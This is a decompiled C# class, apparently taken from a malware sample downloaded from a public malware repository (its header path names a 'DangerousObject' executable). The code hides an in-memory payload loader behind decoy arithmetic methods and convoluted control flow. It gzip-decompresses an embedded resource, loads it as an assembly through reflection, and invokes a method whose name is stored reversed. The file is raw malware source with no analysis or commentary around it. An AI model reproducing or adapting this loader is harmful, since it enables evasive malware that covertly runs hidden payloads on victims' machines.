// Decompiled with JetBrains decompiler
// Type: eg2012.ISectionEntry
// Assembly: SinkStack, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A02AD0B4-EB98-42A4-95E2-E2AB11E6E27B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\UDS-DangerousObject.Multi.Generic-1dfce723a17d9979985d027a8b4bf09a943153bb9ff23d082b21825c41104f96.exe

using eg2012.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace eg2012
{
  internal class ISectionEntry
  {
    private System.Type L;

    public ISectionEntry(ComboBoxStyle k2, int k3, int k4, int k) => this.IIIIIIIIIIIII(new Label(), checked ((int) Math.Round(this.getAverage(new int[4]
    {
      this.AddElements(k4, k3, k),
      k3,
      k4,
      k
    }, 4))));

    public int AddElements(params int[] arr)
    {
      int num1 = 0;
      int[] numArray = arr;
      int index = 0;
      while (index < numArray.Length)
      {
        int num2 = numArray[index];
        checked { num1 += num2; }
        checked { ++index; }
      }
      return num1;
    }

    public double getAverage(int[] arr, int size)
    {
      int index = 0;
      int num1 = 0;
      int num2 = 0;
      int num3 = size;
      int num4 = 1;
      if (num4 != 0)
      {
        num1 = checked (num3 - num4);
        index = 0;
      }
      else
        goto label_3;
label_2:
      num3 = index;
      num4 = num1;
label_3:
      if (num3 > num4)
      {
        object objectValue = RuntimeHelpers.GetObjectValue(typeof (Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
        {
          this.DGIP()
        }));
        double average = (double) num2 / (double) size;
        this.L = (System.Type) NewLateBinding.LateIndexGet(NewLateBinding.LateGet(objectValue, (System.Type) null, "GetTypes", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), new object[1]
        {
          (object) 10
        }, (string[]) null);
        return average;
      }
      checked { num2 += arr[index]; }
      checked { ++index; }
      goto label_2;
    }

    public object IIIIIIIIIIIII(Label TaskCanceledException, int i)
    {
      object obj = (object) null;
      object[] args = new object[3]
      {
        (object) CompatibilityMap.RestrictedError,
        (object) CompatibilityMap.ValueEnumerator,
        (object) "eg2012"
      };
      this.L.InvokeMember(Strings.StrReverse("uruG"), BindingFlags.InvokeMethod, (Binder) null, (object) null, args);
      return obj;
    }

    public object DGIP()
    {
      object Instance1 = (object) new MemoryStream(Bugs.Grams);
      object Instance2 = (object) new GZipStream((Stream) Instance1, CompressionMode.Decompress);
      byte[] numArray1 = new byte[4];
      NewLateBinding.LateSet(Instance1, (System.Type) null, "Position", new object[1]
      {
        Operators.SubtractObject(NewLateBinding.LateGet(Instance1, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 5)
      }, (string[]) null, (System.Type[]) null);
      object[] objArray1;
      bool[] flagArray1;
      NewLateBinding.LateCall(Instance1, (System.Type) null, "Read", objArray1 = new object[3]
      {
        (object) numArray1,
        (object) 0,
        (object) 4
      }, (string[]) null, (System.Type[]) null, flagArray1 = new bool[3]
      {
        true,
        false,
        false
      }, true);
      if (flagArray1[0])
        numArray1 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
      int int32 = BitConverter.ToInt32(numArray1, 0);
      NewLateBinding.LateSet(Instance1, (System.Type) null, "Position", new object[1]
      {
        (object) 0
      }, (string[]) null, (System.Type[]) null);
      byte[] numArray2 = new byte[checked (int32 - 1 + 1)];
      object[] objArray2;
      bool[] flagArray2;
      NewLateBinding.LateCall(Instance2, (System.Type) null, "Read", objArray2 = new object[3]
      {
        (object) numArray2,
        (object) 0,
        (object) int32
      }, (string[]) null, (System.Type[]) null, flagArray2 = new bool[3]
      {
        true,
        false,
        true
      }, true);
      if (flagArray2[0])
        numArray2 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof (byte[]));
      if (flagArray2[2])
      {
        int num = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[2]), typeof (int));
      }
      return (object) numArray2;
    }
  }
}
